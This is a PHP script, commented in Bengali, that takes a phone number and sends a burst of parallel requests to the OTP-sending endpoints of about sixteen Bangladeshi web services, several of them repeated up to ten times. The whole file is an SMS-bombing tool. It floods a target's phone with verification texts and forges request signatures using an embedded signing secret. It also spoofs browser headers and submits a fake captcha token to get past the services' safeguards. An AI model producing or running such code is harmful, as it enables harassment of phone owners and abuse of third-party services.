<?php
header('Content-Type: application/json');

$phone = $_GET['phone'] ?? '';
if (empty($phone) || strlen($phone) < 10) {
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ==========================================
// 📱 ফোন নম্বর প্রোসেসিং
// ==========================================
$phone_11 = preg_replace('/^\+?88/', '', $phone); // 01XXXXXXXXX
if (substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;
$deepto_number = "+880" . substr($phone_11, -10);
$phone_osudpotro = "+88-" . $phone_11;
$phone_fundesh = substr($phone_11, 1); // 1XXXXXXXXX

$api_requests = [];

// ==========================================
// 🚀 সার্ভিস লিস্ট (Fixes Applied)
// ==========================================

// 1. Ali2BD (FIXED: Added proper headers & payload)
$api_requests[] = [
    "name" => "ali2bd",
    "url" => "https://edge.ali2bd.com/api/consumer/v1/auth/login",
    "method" => "POST",
    "data" => ["username" => $phone_11],
    "headers" => ['Content-Type:application/json', 'Origin:https://ali2bd.com', 'Referer:https://ali2bd.com/']
];

// 2. DeeptoPlay (FIXED: URL encoding & Headers)
for($i=1;$i<=3;$i++){
    $api_requests[] = [
        "name" => "deeptoplay_$i",
        "url" => "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        "method" => "POST",
        "data" => ["number" => $deepto_number],
        "headers" => ['Content-Type:application/json', 'Origin:https://www.deeptoplay.com']
    ];
}

// 3. Fundesh (FIXED: Correct Endpoint)
$api_requests[] = [
    "name" => "fundesh",
    "url" => "https://fundesh.com.bd/api/auth/generateOTP",
    "method" => "POST",
    "data" => ["msisdn" => $phone_11],
    "headers" => ['Content-Type:application/json', 'Referer:https://fundesh.com.bd/']
];

// 4. Swap (Signature Logic)
$swap_secret = "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE=";
$swap_timestamp = (string) time();
$swap_signature = base64_encode(hash_hmac('sha256', $deepto_number . $swap_timestamp, $swap_secret, true));
$api_requests[] = ["name"=>"swap","url"=>"https://api.swap.com.bd/api/v1/send-otp/v2","method"=>"POST","data"=>["phone"=>$deepto_number,"timestamp"=>(int)$swap_timestamp],"headers"=>['Content-Type:application/json','signature:'.$swap_signature]];

// 5. Hishabee
$api_requests[] = ["name"=>"hishabee","url"=>"https://app.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88","method"=>"POST","headers"=>['content-length:0','Origin:https://web.hishabee.business']];

// 6. PBS (5 Times)
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"pbs_$i","url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","method"=>"POST","data"=>["userPhone"=>$phone_11],"headers"=>['Content-Type:application/json']];

// 7. ShadhinMusic (10 Times)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"shadhin_$i","url"=>"https://connect.shadhinmusic.com/v1/api//otp/send","method"=>"POST","data"=>["msisdn"=>$phone_88],"headers"=>['Content-Type:application/json']];

// 8. RedX (10 Times)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];

// 9. Bikroy (10 Times)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];

// 10. BDTickets (10 Times)
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com:20100/v1/auth","method"=>"POST","data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json']];

// 11. Shwapno (5 Times)
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"shwapno_$i","url"=>"https://www.shwapno.com/api/auth","method"=>"POST","data"=>["phoneNumber"=>$phone_plus88],"headers"=>['Content-Type:application/json']];

// 12. Garibook (5 Times)
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"garibook_$i","url"=>"https://api.garibookadmin.com/api/v4/user/login","method"=>"POST","data"=>["mobile"=>$phone_plus88,"recaptcha_token"=>"garibookcaptcha","channel"=>"web"],"headers"=>['Content-Type:application/json']];

// 13. Shikho (3 Times)
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shikho_$i","url"=>"https://api.shikho.com/auth/v2/send/sms","method"=>"POST","data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],"headers"=>['Content-Type:application/json']];

// 14. Iqra (3 Times)
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"iqra_$i","url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,"method"=>"GET"];

// 15. Osudpotro
$api_requests[] = ["name"=>"osudpotro","url"=>"https://api.osudpotro.com/api/v1/users/send_otp","method"=>"POST","data"=>["mobile"=>$phone_osudpotro,"deviceToken"=>"web","language"=>"en","os"=>"web"],"headers"=>['Content-Type:application/json']];

// 16. Apex4u
$api_requests[] = ["name"=>"apex4u","url"=>"https://api.apex4u.com/api/auth/login","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];


// ==========================================
// ⚡ Parallel Execution Engine
// ==========================================
$mh = curl_multi_init();
$handles = [];

foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = $api['headers'] ?? [];
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if(isset($api['method']) && $api['method'] === "POST"){
        curl_setopt($ch, CURLOPT_POST, true);
        $postData = (isset($api['data'])) ? json_encode($api['data']) : "";
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    } else {
        curl_setopt($ch, CURLOPT_POST, false);
    }

    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do {
    curl_multi_exec($mh, $running);
    curl_multi_select($mh);
} while ($running > 0);

$final_results = [];
foreach($handles as $key => $ch){
    $final_results[$api_requests[$key]['name']] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "total_hits" => count($api_requests), "results" => $final_results], JSON_PRETTY_PRINT);
?>
